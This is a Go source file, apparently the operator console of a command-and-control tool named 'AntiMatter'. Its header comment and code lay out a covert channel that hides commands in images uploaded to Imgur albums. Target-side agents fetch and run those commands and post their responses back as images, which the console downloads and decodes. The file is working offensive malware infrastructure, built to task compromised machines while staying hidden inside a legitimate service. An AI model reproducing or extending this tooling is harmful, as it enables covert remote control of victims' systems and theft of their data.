// TODO:
// Error handling []
// Display walkthroughs for each module [√]
// Set up mysql and configure it for multiple agent handlings []
// Error handling for existing tables and what not [√]
// Set up tasking module / Database []
// Fix some of the verbiage on the modules so that it makes a bit more sense []
// Maybe some autocomplete and up arrow stuff []
// Add the ability to upload to other albums []
// Change all the options so that when you type "options" and the value exists, it queries the database and not the global maps []
// 		--> Eh, I think this is fine, I'll try and see what others think

/*
 My thought right now is that this will look for any descriptions that mention the word "response"
 For right now, and then maybe get a big dict of words that will mean specific things

 Beta build:

 1. Create an image with an encoded command in it
 2. Create an album for this to go in, with a particular title (That will be created within the payload so that when the agent executes the payload, it will know what album to look for)
 3. Add "tasking image" to this album (or any other /shrug)
 4. <Target runs payload, grabs image and decodes/runs payload, uploads new image with response to the same album>
 5. C2 Server will pull any album it has marked as "ACTIVE", and see if there are any new images
 6. Either alert the operator or have to operator do a manual check, and show that there is a new image with a reponse in it
 7. Either auto-show the response to the operator or have the operator use the Reponse module to check the response for a particular target

*/

package main

import (
	"bufio"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"sort"
	"strings"

	// Internal libs
	"github.com/AntiMatter/cmd"
	"github.com/AntiMatter/internal"

	// External libs
	"github.com/fatih/color"
	"github.com/jwangsadinata/go-multimap/slicemultimap"
	"github.com/manifoldco/promptui"
)

// validateOptions is a function that just helps check to make sure you're choosing a correct option
func validateOptions(slice []string, val string) bool {
	for _, item := range slice {
		if strings.EqualFold(item, val) {
			return true
		}
	}
	return false
}

// Global map for the Image module
var imageOptions = map[string]string{"Command": "", "BaseImage": "", "NewFilename": "", "ClientID": ""}

// Global map for the Album module
var albumOptions = map[string]string{"Title": "", "Client-ID": "", "AlbumID": "", "Album Delete-Hash": ""}

// Global map for the Task module
var taskOptions = map[string]string{"TaskingImageRaw": "", "TaskingImage": "", "Title": "", "DeleteHash": "", "Description": "", "ClientID": ""}

// Global map for the Response module
var responseOptions = map[string]string{"AlbumID": "", "ClientID": ""}

// Global multimap for holding several different types of variables returned from the imgur API
var imgurItems = slicemultimap.New() // empty

// yesNo() is just a function that helps ask the user yes or no lmao
func yesNo() bool {
	prompt := promptui.Select{
		Label: "Would you like to upload most recently created image to this album?[Yes/No]",
		Items: []string{"Yes", "No"},
	}
	_, result, err := prompt.Run()
	if err != nil {
		log.Fatalf("Prompt failed %v\n", err)
	}
	return result == "Yes"
}

func main() {
	for {
		options := []string{"Options", "Image", "Album", "Agent", "Task", "List", "Delete", "Response", "Init", "Quit", "Exit"}
		validate := func(input string) error {
			// _, err := strconv.ParseFloat(input, 64)
			found := validateOptions(options, input)

			if !found {
				return errors.New("Invalid Option")
			}

			return nil
		}

		// Each template displays the data received from the prompt with some formatting.
		templates := &promptui.PromptTemplates{
			Prompt:  "{{ . }} ",
			Valid:   "{{ . | green }} ",
			Invalid: "{{ . | red }} ",
			Success: "{{ . | cyan }} ",
		}

		prompt := promptui.Prompt{
			Label:     "AntiMatter >>",
			Templates: templates,
			Validate:  validate,
		}

		result, err := prompt.Run()

		if err != nil {
			fmt.Printf("Prompt failed %v\n", err)
			return
		}

		//fmt.Printf("You chose %q\n", result)

		if strings.EqualFold(result, "options") {
			fmt.Println("")
			fmt.Println(color.YellowString("[ Valid Commands ]	[ Description ]"))
			fmt.Println("------------------      ---------------") // Literally just aethetic
			fmt.Println(" ")
			fmt.Println(" Image		Create an Image for agent tasking")
			fmt.Println(" Album		Create an Album for agent responses")
			fmt.Println(" Task		Create Tasking for agent")
			fmt.Println(" List		List images, albums, agents, and tasks")
			fmt.Println(" Response	Search for any pending responses within an album")
			fmt.Println(" Options	List out different options/modules you can choose from")
			//	fmt.Println(" Init		Have the server walk you through filling in the options you need")
			fmt.Println(" Exit		Exit program")
			fmt.Println(" ")
			fmt.Println(color.YellowString("[ The order these should be run in ] "))
			fmt.Println(" ")
			fmt.Println("1. Image\n2. Album\n3. Task\n4. Response")
			fmt.Println(" ")
		}

		if strings.EqualFold(result, "exit") {
			os.Exit(0)
		}

		if strings.EqualFold(result, "Image") {
			for {
				reader := bufio.NewReader(os.Stdin)
				color.Set(color.FgGreen)
				fmt.Print("AntiMatter/Image >> ")
				color.Unset()
				text, _ := reader.ReadString('\n')

				if strings.TrimRight(text, "\n") == "options" {
					fmt.Println(" ")
					fmt.Println(color.YellowString("==[ OPTIONS ]=="))

					for key, value := range imageOptions {
						if value == "" {

							fmt.Println(color.CyanString(key), ": None")
						} else {
							fmt.Println(color.CyanString(key), ":", value)
						}

					}
					fmt.Println(" ")
				} else if strings.Contains(text, "help") {
					fmt.Println(" ")
					fmt.Println(color.YellowString("==[ HOW TO USE ]=="))
					fmt.Println("set <option> <value>")
					fmt.Println("TO RUN MODULE: go")
					fmt.Println(" ")
					fmt.Println(color.YellowString("==[ OPTIONS THAT NEED TO BE SET ]=="))
					fmt.Println("client-id\ncommand\nbase-image\nnew-filename")
					fmt.Println(" ")

				} else if strings.Contains(text, "set") {

					// TODO: If this isn't set it breaks, handle that
					if strings.Contains(text, "command") {
						command := strings.Split(text, "command ")
						imageOptions["Command"] = strings.Replace(strings.Join(command[1:], ""), "\n", "", -1)

					} else if strings.Contains(text, "base-image") {
						baseImage := strings.Split(text, "base-image ")
						imageOptions["BaseImage"] = strings.Replace(strings.Join(baseImage[1:], ""), "\n", "", -1)

					} else if strings.Contains(text, "new-filename") {
						newFilename := strings.Split(text, "new-filename ")
						imageOptions["NewFilename"] = strings.Replace(strings.Join(newFilename[1:], ""), "\n", "", -1)

					} else if strings.Contains(text, "client-id") {
						clientID := strings.Split(text, "client-id ")
						imageOptions["ClientID"] = strings.Replace(strings.Join(clientID[1:], ""), "\n", "", -1)

					}

				} else if strings.Contains(text, "go") {
					cmd.CreateImage(imageOptions["Command"], imageOptions["BaseImage"], imageOptions["NewFilename"])
					// Utilizes the mysql stuff, currently have it set up on a Docker test server
					internal.InsertImages(imageOptions["Command"], imageOptions["BaseImage"], imageOptions["NewFilename"])

				} else if strings.Contains(text, "exit") {
					break
				}

			}
		}

		if strings.EqualFold(result, "Album") {
			for {
				reader := bufio.NewReader(os.Stdin)
				color.Set(color.FgGreen)
				fmt.Print("AntiMatter/Album >> ")
				color.Unset()
				// Had to do this since case sensitivity is dumb in golang
				initialText, _ := reader.ReadString('\n')
				text := strings.ToLower(initialText)

				// Check to see if this value was set in the Image module
				if val, ok := imageOptions["ClientId"]; ok {
					albumOptions["Client-ID"] = val
				}

				// Check to see if this value was set in the Image module
				if val, ok := imageOptions["AlbumId"]; ok {
					albumOptions["AlbumID"] = val
				}

				// Check to see if this value was set in the Image module
				if val, ok := imageOptions["ClientID"]; ok {
					albumOptions["Client-ID"] = val
				}

				if strings.TrimRight(text, "\n") == "options" {
					fmt.Println(" ")
					fmt.Println(color.YellowString("==[ OPTIONS ]=="))

					for key, value := range albumOptions {
						if value == "" {

							fmt.Println(color.CyanString(key), ": None")
						} else {
							fmt.Println(color.CyanString(key), ":", value)
						}

					}

					fmt.Println(" ")
				} else if strings.Contains(text, "help") {
					fmt.Println(" ")
					fmt.Println(color.YellowString("==[ HOW TO USE ]=="))
					fmt.Println("set <option> <value>")
					fmt.Println("TO RUN MODULE: go")
					fmt.Println(" ")
					fmt.Println(color.YellowString("==[ OPTIONS THAT NEED TO BE SET ]=="))
					fmt.Println("title")
					fmt.Println(" ")

				} else if strings.Contains(text, "set") {
					if strings.Contains(text, "title") {
						title := strings.Split(text, "title ")
						albumOptions["Title"] = strings.Replace(strings.Join(title[1:], ""), "\n", "", -1)

					} else if strings.Contains(text, "client-id") {
						clientID := strings.Split(text, "client-id ")
						albumOptions["Client-ID"] = strings.Replace(strings.Join(clientID[1:], ""), "\n", "", -1)
					}

				} else if strings.Contains(text, "list") {
					fmt.Println("\n", color.CyanString("AlbumHash:"), albumOptions["Album Delete-Hash"], "|", color.CyanString("Album ID:"), albumOptions["AlbumID"], "|", color.CyanString("Title:"), albumOptions["Title"])
					fmt.Println(" ")

				} else if strings.Contains(text, "go") {
					albumID, deletehash := cmd.CreateAlbum(albumOptions["Title"], albumOptions["Client-ID"])
					albumOptions["AlbumID"] = albumID.(string)
					albumOptions["Album Delete-Hash"] = deletehash.(string)
					// Utilizes the mysql stuff, currently have it set up on a Docker test server
					internal.InsertAlbum(albumOptions["Title"], albumOptions["AlbumID"], albumOptions["Album Delete-Hash"])

				} else if strings.Contains(text, "exit") {
					break
				}

			}

		}
		if strings.EqualFold(result, "Task") {
			for {
				reader := bufio.NewReader(os.Stdin)
				color.Set(color.FgGreen)
				fmt.Print("AntiMatter/Task >> ")
				color.Unset()
				// Had to do this since case sensitivity is dumb in golang
				initialText, _ := reader.ReadString('\n')
				text := strings.ToLower(initialText)

				if strings.TrimRight(text, "\n") == "options" {
					fmt.Println(" ")
					fmt.Println(color.YellowString("==[ OPTIONS ]=="))

					// Check to see if this value was set in the Image module
					if val, ok := imageOptions["ClientID"]; ok {
						taskOptions["ClientID"] = val
					}
					// Check to see if this value was set in the Album module (it should have been, add error handling if not)
					if val, ok := albumOptions["Delete-Hash"]; ok {
						taskOptions["DeleteHash"] = val
					}

					for key, value := range taskOptions {
						if value == "" {

							fmt.Println(color.CyanString(key), ": None")
						} else {
							fmt.Println(color.CyanString(key), ":", value)
						}

					}
					fmt.Println(" ")
				} else if strings.Contains(text, "help") {
					fmt.Println(" ")
					fmt.Println(color.YellowString("==[ HOW TO USE ]=="))
					fmt.Println("set <option> <value>")
					fmt.Println("TO RUN MODULE: go")
					fmt.Println(" ")
					fmt.Println(color.YellowString("==[ OPTIONS THAT NEED TO BE SET ]=="))
					fmt.Println("description\ntasking-image\ntitle")
					fmt.Println(" ")

				} else if strings.Contains(text, "set") {
					if strings.Contains(text, "title") {
						taskTitle := strings.Split(text, "title ")
						taskOptions["Title"] = strings.Replace(strings.Join(taskTitle[1:], ""), "\n", "", -1)

					} else if strings.Contains(text, "tasking-image") {

						taskImage := strings.Split(text, "tasking-image ")
						taskOptions["TaskingImageRaw"] = strings.Replace(strings.Join(taskImage[1:], ""), "\n", "", -1)

						// Open local image file
						f, _ := os.Open("./" + strings.Replace(strings.Join(taskImage[1:], ""), "\n", "", -1))

						reader := bufio.NewReader(f)
						content, _ := ioutil.ReadAll(reader)
						// Convert image file data to base64
						encoded := base64.StdEncoding.EncodeToString(content)
						taskOptions["TaskingImage"] = encoded

					} else if strings.Contains(text, "delete-hash") {
						deleteHash := strings.Split(text, "delete-hash ")
						taskOptions["DeleteHash"] = strings.Replace(strings.Join(deleteHash[1:], ""), "\n", "", -1)

					} else if strings.Contains(text, "description") {
						taskDescrip := strings.Split(text, "description ")
						taskOptions["Description"] = strings.Replace(strings.Join(taskDescrip[1:], ""), "\n", "", -1)

					} else if strings.Contains(text, "client-id") {
						clientID := strings.Split(text, "client-id ")
						taskOptions["ClientID"] = strings.Replace(strings.Join(clientID[1:], ""), "\n", "", -1)

					}

				} else if strings.Contains(text, "go") {
					imageID, deletehash := cmd.UploadImage(taskOptions["TaskingImage"], taskOptions["Title"], taskOptions["AlbumID"], taskOptions["Description"], taskOptions["ClientID"])

					imgurItems.Put("ImageID", imageID)
					imgurItems.Put("ImageDeleteHash", deletehash)

					// Here ask the user if they want to upload the previously created image to this new album

					//confirmAdd := yesNo()
					//if confirmAdd {
					cmd.AddImage(albumOptions["Album Delete-Hash"], imageOptions["ClientID"], deletehash.(string))
					fmt.Println(color.GreenString("[+]"), "Successfully upload image to Album:", albumOptions["Title"])
					internal.InsertTask(taskOptions["TaskingImageRaw"], taskOptions["Title"], taskOptions["Description"], imageID.(string), deletehash.(string))
					//}
					//fmt.Println(success, "|", status)

				} else if strings.Contains(text, "exit") {
					break
				} else if strings.Contains(text, "list") {
					values := imgurItems.Values() // Grabs values in random order

					// Workaround to make sure we grab values in a sorted order every time
					tmp := make([]string, len(values))
					count := 0
					for _, value := range values {
						tmp[count] = value.(string)
						count++
					}
					sort.Strings(tmp)

					// DeleteHash == 15 bytes long
					// ImageID == 7 bytes long

					// Check the lengths to appropriately label values
					for _, items := range tmp {
						if len(items) == 15 {
							fmt.Println(color.GreenString("[+]"), "Image Delete Hash is:", items)
						} else if len(items) == 7 {
							fmt.Println(color.GreenString("[+]"), "Image ID is:", items)
						}
					}

				}

			}

		}

		if strings.EqualFold(result, "Response") {
			for {
				reader := bufio.NewReader(os.Stdin)
				color.Set(color.FgGreen)
				fmt.Print("AntiMatter/Response >> ")
				color.Unset()
				// Had to do this since case sensitivity is dumb in golang
				initialText, _ := reader.ReadString('\n')
				text := strings.ToLower(initialText)

				if val, ok := albumOptions["AlbumID"]; ok {
					responseOptions["AlbumID"] = val
				}

				if val, ok := albumOptions["Client-ID"]; ok {
					responseOptions["ClientID"] = val

				}

				if strings.TrimRight(text, "\n") == "options" {
					fmt.Println(" ")
					fmt.Println(color.YellowString("==[ OPTIONS ]=="))

					for key, value := range responseOptions {
						if value == "" {

							fmt.Println(color.CyanString(key), ": None")
						} else {
							fmt.Println(color.CyanString(key), ":", value)
						}

					}
					fmt.Println("\n")

				} else if strings.Contains(text, "check") {
					albumID := responseOptions["AlbumID"]
					clientID := responseOptions["ClientID"]

					linkImage := cmd.GetAlbumImages(albumID, clientID)

					response, e := http.Get(linkImage.(string))
					if e != nil {
						log.Fatal(e)
					}
					defer response.Body.Close()

					// open a file for writing
					// Should probably have the user define what and where to call this
					file, err := os.Create("/tmp/asdf.jpg")
					if err != nil {
						log.Fatal(err)
					}
					defer file.Close()

					// Use io.Copy to just dump the response body to the file. This supports huge files
					_, err = io.Copy(file, response.Body)
					if err != nil {
						log.Fatal(err)
					}
					fmt.Println("Get response: Success!")
					fmt.Println(" ")

					fmt.Println(color.GreenString("Response") + ":")
					fmt.Println(" ")

					cmd.DecodeImage()

					fmt.Println(" ")

				} else if strings.Contains(text, "exit") {
					break
				}
			}
		}

		if strings.EqualFold(result, "Init") {
			fmt.Println("Starting the simulation for you...")
			fmt.Println("This will walk you through the options that you need to get this started")

		}

		if strings.EqualFold(result, "List") {
			for {
				reader := bufio.NewReader(os.Stdin)
				color.Set(color.FgGreen)
				fmt.Print("AntiMatter/List >> ")
				color.Unset()
				// Had to do this since case sensitivity is dumb in golang
				initialText, _ := reader.ReadString('\n')
				text := strings.ToLower(initialText)

				if strings.Contains(text, "help") {
					fmt.Println(" ")
					fmt.Println(color.YellowString("==[ OPTIONS ]=="))
					fmt.Println(color.GreenString("To list images:"), "list images")
					fmt.Println(color.GreenString("To list albums:"), "list albums")
					fmt.Println(color.GreenString("To list taskings:"), "list taskings")
					fmt.Println(" ")

				} else if strings.Contains(text, "list images") {
					fmt.Println(" ")
					fmt.Println(color.YellowString("===[ IMAGES ]==="))
					internal.GetImages()
					fmt.Println(" ")
				} else if strings.Contains(text, "list albums") {
					fmt.Println(" ")
					fmt.Println(color.YellowString("===[ ALBUMS ]==="))
					internal.GetAlbums()
					fmt.Println(" ")

				} else if strings.Contains(text, "exit") {
					break
				}
			}
		}
	}
}
